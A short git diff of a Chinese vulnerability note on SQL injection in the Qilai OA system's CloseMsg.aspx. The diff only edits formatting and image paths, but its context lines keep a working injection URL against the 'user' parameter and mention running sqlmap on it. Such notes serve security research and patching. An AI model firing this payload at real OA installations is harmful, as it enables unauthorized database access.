@@ -22,12 +22,12 @@ app="启莱OA"
 
 存在SQL注入的文件为 CloseMsg.aspx
 
-```plain
+```
 http://xxx.xxx.xxx.xxx/client/CloseMsg.aspx?user=' and (select db_name())>0--&pwd=1
 ```
 
-![qilai-3-1](images/qilai-3-1.png)
+![qilai-3-1](../.gitbook/assets/qilai-3-1.png)
 
 使用SQLmap对参数 user 进行注入
 
-![qilai-3-2](images/qilai-3-2.png)
+![qilai-3-2](../.gitbook/assets/qilai-3-2.png)
